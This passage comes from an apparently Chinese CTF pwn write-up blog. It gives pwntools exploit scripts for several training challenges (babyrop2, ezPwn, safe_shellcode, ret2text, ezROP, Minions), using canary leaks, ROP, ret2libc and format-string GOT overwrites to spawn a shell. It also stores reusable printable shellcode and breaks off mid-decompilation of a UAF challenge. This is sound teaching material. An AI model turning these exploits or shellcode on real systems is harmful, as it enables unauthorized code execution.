class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push edx<br>push 0x36363630<br>push esp<br>pop ecx<br>xor dword ptr ds:[ecx],esi<br>xor esi,dword ptr ds:[ecx]<br>pop eax<br>push 0x33333333<br>xor dword ptr ds:[ecx],esi<br>imul esi,dword ptr ds:[ecx],0x33<br>pop eax<br>push 0x69<br>push esi<br>xor dword ptr ds:[ecx],esi<br>dec eax<br>arpl word ptr ds:[ecx],si<br>pop edx<br>pop eax<br>pop ecx<br>xor word ptr ds:[ecx+esi*2+0x49],dx<br>dec eax<br>cmp word ptr ds:[ebx+0x44],bp<br>jno short tested.004780A6<br>xor byte ptr ds:[edx],dh<br>inc esp<br>jno short tested.004780AC<br>xor byte ptr ds:[ecx+esi+0x48],al<br>jnz short tested.0047808D<br>dec ebp<br>xor al,byte ptr ds:[edi+0x30]<br>pop edx<br>xor ch,byte ptr ds:[edi+0x34]<br>dec eax<br>xor byte ptr ss:[ebp+0x30],dh<br>push eax<br>xor dword ptr ds:[esi],esi<br>xor byte ptr ds:[edx+0x30],bl<br>aaa<br>dec edi<br>xor byte ptr ds:[edx+0x30],bl<br>inc ebx<br>xor dword ptr ds:[eax],esi<br>xor byte ptr ds:[ecx+0x35],bh<br>dec edi<br>xor eax,dword ptr ds:[edi+0x30]<br>xor dh,byte ptr ds:[eax]<br>inc edx<br>xor ch,byte ptr ds:[esi+0x30]<br>xor byte ptr ss:[esi+0x34],cl<br>jno short tested.004780B8<br>outs dx,byte ptr es:[edi]<br>xor dh,byte ptr ds:[eax+esi+0x42]<br>xor byte ptr ds:[eax],dh<br>xor byte ptr ds:[ecx],dh<br>xor byte ptr ds:[ecx],dh<br>xor byte ptr ds:[eax+0x33],cl<br>push ebx<br>xor bh,byte ptr ds:[ecx+0x30]<br>pop ecx<br>xor byte ptr ds:[edi+0x30],cl<br>outs dx,byte ptr es:[edi]<br>xor byte ptr ds:[edx+0x30],bh<br>xor dword ptr ds:[ebx],esi<br>xor al,0x30<br>xor al,byte ptr fs:[esi+0x34]<br>jns short tested.004780E4<br>push eax<br>xor dword ptr ds:[ecx],esi<br>xor eax,0x306E316C<br>dec edx<br>xor byte ptr ds:[eax+0x30],ch<br>popad<br>xor byte ptr ds:[edi],dh<br>xor byte ptr ds:[eax+eax],dh<br>add bh,bh<br>add byte ptr ds:[eax],al<br>add bh,bh<br><br>pop eax<br>inc ecx<br></code></pre></td></tr></table></figure>

<p>shellcode:&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>ip = <span class="hljs-string">&quot;&quot;</span><br>port = <br>io = remote(ip,port)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)    <span class="hljs-comment">##绕过1</span><br>shellcode = <span class="hljs-string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br><span class="hljs-string">io.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="hljs-string">io.sendline(&#x27;</span>opt:<span class="hljs-number">2</span>\r\nmsg:<span class="hljs-string">&#x27;+shellcode+&#x27;</span>\r\n<span class="hljs-string">&#x27;)    #poc</span><br><span class="hljs-string">io.interactive()</span><br></code></pre></td></tr></table></figure>

<h3 id="P-BJDCTF-2020-babyrop2-str1k3"><a href="#P-BJDCTF-2020-babyrop2-str1k3" class="headerlink" title="P | [BJDCTF 2020]babyrop2 | str1k3"></a>P | [BJDCTF 2020]babyrop2 | str1k3</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>pwnfile= <span class="hljs-string">&#x27;./pwn&#x27;</span><br> io = process(pwnfile)<br><span class="hljs-comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28352)</span><br>elf = ELF(pwnfile)<br>rop = ROP(pwnfile)<br><br>io.recvuntil(<span class="hljs-string">&#x27;give u some gift to help u!\n&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>io.sendline(<span class="hljs-string">&#x27;%7$p&#x27;</span>)        <span class="hljs-comment">#格式化字符串泄露canary</span><br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary&#x27;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>return_addr = elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_ret = <span class="hljs-number">0x4005f9</span><br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x400991</span>          <span class="hljs-comment">#ROPgadgets</span><br><br><span class="hljs-comment"># 0x0000000000400993 : pop rdi ; ret</span><br><span class="hljs-comment"># 0x0000000000400991 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-comment"># 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-comment"># 0x00000000004005f9 : ret</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>) +p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(return_addr)<br><span class="hljs-comment">#payload = payload.ljust(200, &#x27;a&#x27;)</span><br><span class="hljs-comment">#sub_40063D(v1, 200LL, 10LL);</span><br><span class="hljs-comment">#delimiter = &#x27;Hello,do you want to play a game with me???&#x27;</span><br>io.recvuntil(<span class="hljs-string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)<br>io.sendline(payload)<span class="hljs-comment">#rop泄露puts地址</span><br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;puts_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;system_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bin_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(bin_addr))<br><br><span class="hljs-comment">#很奇怪为啥第二次不用再泄露canary</span><br><span class="hljs-comment"># io.recvuntil(&#x27;give u some gift to help u!\n&#x27;)</span><br><span class="hljs-comment"># io.sendline(&#x27;%7$p&#x27;)</span><br><span class="hljs-comment"># canary = int(io.recv(18),16)</span><br><span class="hljs-comment"># print(&#x27;canary&#x27;,hex(canary))</span><br><span class="hljs-comment">#第二次的rop链</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>) +p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)<br>io.recvuntil(<span class="hljs-string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-NUSTCTF-2022-新生赛-ezPwn-解题做题人"><a href="#P-NUSTCTF-2022-新生赛-ezPwn-解题做题人" class="headerlink" title="P |[NUSTCTF 2022 新生赛]ezPwn | 解题做题人"></a>P |[NUSTCTF 2022 新生赛]ezPwn | 解题做题人</h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>pwnfile= <span class="hljs-string">&#x27;./ezpwn&#x27;</span><br><span class="hljs-comment"># io = process(pwnfile)</span><br>io = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28938</span>)<br><span class="hljs-comment">#elf = ELF(pwnfile)</span><br><span class="hljs-comment"># rop = ROP(pwnfile)</span><br><span class="hljs-comment"># libc =elf.libc</span><br>padding = <span class="hljs-number">0x0A</span>+<span class="hljs-number">0x08</span><br>ret = <span class="hljs-number">0x40101a</span><br>fun_addr = <span class="hljs-number">0x401229</span> <span class="hljs-comment">#需要返回的漏洞函数</span><br><br>payload1 = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*padding ,fun_addr])<br><span class="hljs-built_in">print</span>(payload1)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;Your name plz:\n&#x27;</span>,payload1)<br><span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-comment"># io.interactive()</span><br></code></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-Week1-safe-shellcode"><a href="#HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="[HNCTF 2022 Week1]safe_shellcode"></a>[HNCTF 2022 Week1]safe_shellcode</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><p>可见字符 shellcode（指能被 ASCII 打印出来的字符）</p>
<h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># io = process(“./shellcoder”)</span><br>io = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28519</span>)<br>shellcode=<span class="hljs-string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>存个 shellcode</p>
<p>x64 下的： Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P1 60Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l 1n0J0h0a070t</p>
<p>x32 下的： PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6 MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8 MK0AA</p>
<h3 id="MoeCTF-2022-ret2text"><a href="#MoeCTF-2022-ret2text" class="headerlink" title="[MoeCTF 2022]ret2text"></a>[MoeCTF 2022]ret2text</h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p class='item-img' data-src='/2024/03/15/MyS3andB0x/WmsUbH7ApoL7ERxa8yrcp0Tznxe.png'><img src="/2024/03/15/MyS3andB0x/WmsUbH7ApoL7ERxa8yrcp0Tznxe.png"></p>
<p>啥保护都没</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/JpWvbCs2qoh37axDT9HcfLfdnub.png'><img src="/2024/03/15/MyS3andB0x/JpWvbCs2qoh37axDT9HcfLfdnub.png"></p>
<p>有溢出</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Xy79bWkmfoM55mxJaIqcZTp4nBf.png'><img src="/2024/03/15/MyS3andB0x/Xy79bWkmfoM55mxJaIqcZTp4nBf.png"></p>
<p>有后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28240</span>)<br><br>padding = <span class="hljs-number">0x48</span><br>back_door = <span class="hljs-number">0x4014BE</span> <br>ret_addr = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x48</span> + p64(ret_addr) + p64(back_door) <br>dem = <span class="hljs-string">&quot;please input\n&quot;</span><br><span class="hljs-comment"># io.sendafter(dem , payload)</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="MoeCTF-2021-ezROP"><a href="#MoeCTF-2021-ezROP" class="headerlink" title="[MoeCTF 2021]ezROP"></a>[MoeCTF 2021]ezROP</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><p>strlen 会被\x00 截断，别的 ret2libc 就行，libc 版本比较怪，放个官方 wp</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/DyyHbfDQsoPSHYx899rcbNj8nlg.png'><img src="/2024/03/15/MyS3andB0x/DyyHbfDQsoPSHYx899rcbNj8nlg.png"></p>
<h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sgtlibc <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sgtlibc<br>p = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28725</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ezrop&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_addr = <span class="hljs-number">0x400c83</span><br>ret_addr = <span class="hljs-number">0x4006b9</span><br>encrypt = <span class="hljs-number">0x4009A0</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>s = sgtlibc.Searcher()<br>s.add_condition(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>s.dump(db_index=<span class="hljs-number">15</span>) <span class="hljs-comment"># search libc , if returns multi-result ,default use index-0&#x27;s result</span><br><br>system_addr = s.get_address(sgtlibc.s_system)<br>binsh_addr = s.get_address(sgtlibc.s_binsh)<br>puts_addr_ = s.get_address(sgtlibc.s_puts)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system_addr), <span class="hljs-built_in">hex</span>(binsh_addr), <span class="hljs-built_in">hex</span>(puts_addr_))<br>libc_base = puts_addr - puts_addr_<br>system = libc_base + system_addr<br>bin_sh = libc_base + binsh_addr<br><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)+p64(<span class="hljs-number">0</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><p>本题的格式化字符串漏洞利用比较简单（指使用 pwntools），就把它放栈题这了</p>
<h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p class='item-img' data-src='/2024/03/15/MyS3andB0x/JRaFbjZboohPZPxhra1c41DPng7.png'><img src="/2024/03/15/MyS3andB0x/JRaFbjZboohPZPxhra1c41DPng7.png"></p>
<p>只开了 NX，看看 main。</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/HyqobYah3o9RQtxY23TcNqqJn1d.png'><img src="/2024/03/15/MyS3andB0x/HyqobYah3o9RQtxY23TcNqqJn1d.png"></p>
<p>再看看 vuln，存在明显的格式化字符串漏洞</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/OdKxbrAhcoOEmExvt3Vc7trLndc.png'><img src="/2024/03/15/MyS3andB0x/OdKxbrAhcoOEmExvt3Vc7trLndc.png"></p>
<p>顺着字符串找到些好康的</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/HcerbGci9okTQfxZzNJchP2qnJb.png'><img src="/2024/03/15/MyS3andB0x/HcerbGci9okTQfxZzNJchP2qnJb.png"></p>
<p>所以我们第一轮先改 main 中的判断条件，把 key 改成 102 的长度就能绕过判断条件，利用第二个 read 跳回 vuln，再次利用格式化字符串漏洞把 printf 劫持为 system，重复上面步骤，在 read 处输入&#x2F;bin&#x2F;sh，再次下一次执行 printf（buff）的时候就可以拿到 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&#x27;./minions1&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28731</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./minions1&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key = <span class="hljs-number">0x6010A0</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><br>payload_fmt1 = fmtstr_payload(<span class="hljs-number">6</span>, &#123;key: <span class="hljs-number">0x66</span>&#125;)<br>payload_fmt2 = fmtstr_payload(<span class="hljs-number">6</span>, &#123;printf_got: system_plt&#125;)<br>ret2vuln = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">0x08</span>) + p64(vuln)<br>bin_sh = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;name?\n&#x27;</span>)<br>io.send(payload_fmt1)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;about you\n&#x27;</span>)<br>io.send(ret2vuln)<br>io.recvuntil(<span class="hljs-string">b&#x27;Minions?\n&#x27;</span>)<br>io.send(<span class="hljs-string">b&#x27;g0at&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;name?\n\n&#x27;</span>)<br>io.send(payload_fmt2)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;about you\n&#x27;</span>)<br>io.send(ret2vuln)<br>io.recvuntil(<span class="hljs-string">b&#x27;Minions?\n&#x27;</span>)<br>io.send(<span class="hljs-string">b&#x27;g0at&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;name?\n\n&#x27;</span>)<br>io.send(bin_sh)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[NISACTF 2022]UAF"></a>[NISACTF 2022]UAF</h1><p>查个保护先</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/UcWsbbkvooukbQxgkcfcY7u2nhd.png'><img src="/2024/03/15/MyS3andB0x/UcWsbbkvooukbQxgkcfcY7u2nhd.png"></p>
<p>放进 IDA 看看，主要函数在下面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  v3[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.create&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.delete&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);<br>      <span class="hljs-built_in">putchar</span>(<span class="hljs-number">58</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v3);<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> 